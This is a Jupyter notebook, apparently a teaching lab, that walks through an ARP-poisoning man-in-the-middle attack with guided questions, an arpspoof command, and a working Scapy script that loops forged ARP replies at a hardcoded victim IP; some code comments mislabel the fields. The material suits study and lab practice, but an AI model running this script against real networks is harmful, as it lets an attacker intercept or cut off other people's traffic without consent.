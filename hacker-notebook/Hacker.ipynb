{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ArpSpoof Man-in-the-Middle Attack\n",
    "\n",
    "## Introduction\n",
    "This demonstration illustrates a man-in-the-middle attack, whereby a malicious hacker on the same network as a client and server can intercept communication between the two. We will accomplish this by a technique known as ``ARP poisoning`` that modifies the ARP (Address Resolution Protocol) tables on a different host. \n",
    "\n",
    "## Steps\n",
    "\n",
    "### Before the Attack\n",
    "0. Find you erthernet interface of your server.\n",
    "1. What are the IP addresses of the ``victim`` and ``server``? *(hint: ifconfig)*\n",
    "2. What is the initial ARP table on the ``victim``? *(hint: arp, use the -n option to view IP addresses alone)*\n",
    "3. Can you test the network connectivity between the ``victim`` and ``server``? *(hint: ping)*\n",
    "4. How has the ARP table on the ``victim`` changed now?\n",
    "5. What is the route from the ``victim`` to the ``server``? *(hint: traceroute)*\n",
    "\n",
    "### During the Attack\n",
    "1. On the ``victim``, look at the results of ``ping <server IP>``, ``traceroute <server IP>`` and ``arp``. \n",
    "2. Start ARP poisoning by typing ``sudo arpspoof -t <victim IP> <server IP>``\n",
    "3. Now go back to the ``victim`` and look at the results of ``arp`` and ``traceroute <server IP>``. How does this compare to ``ping``?\n",
    "4. Try to visit the `server` from `victim`, you should not visit the `server` successfully."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "# run this script to deploy the attack\n",
    "from scapy.all import *\n",
    "import sys\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "def op(et, victim, server):\n",
    "    target_mac = getmacbyip(victim)  # get mac of victim\n",
    "    attacker_mac = get_if_hwaddr(et)  # get local mac\n",
    "   \n",
    "    Ether_data = Ether(src=attacker_mac, dst=target_mac) / ARP(op=2, # 标识位\n",
    "                                                              hwsrc=attacker_mac, # hacker's ip\n",
    "                                                              psrc=server, # server's ip\n",
    "                                                              hwdst=target_mac, # server's mac\n",
    "                                                           pdst=victim)  \n",
    "    while True:\n",
    "        sendp(Ether_data, inter=2,\n",
    "              iface=et)  \n",
    "\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    victim = \"192.168.0.103\" # replace this ip with victim's ip address\n",
    "    server = \"192.168.0.1\" # replace this ip with server's ip address\n",
    "    \n",
    "    # posioning arp table of server\n",
    "\n",
    "    while True:\n",
    "        op(\"en0\", \"192.168.0.103\", \"192.168.0.1\")\n",
    "        # op(\"WIFI 2\", \"10.0.0.196\", \"192.168.0.1\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.8 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  },
  "vscode": {
   "interpreter": {
    "hash": "b0fa6594d8f4cbf19f97940f81e996739fb7646882a419484c72d19e05852a7e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
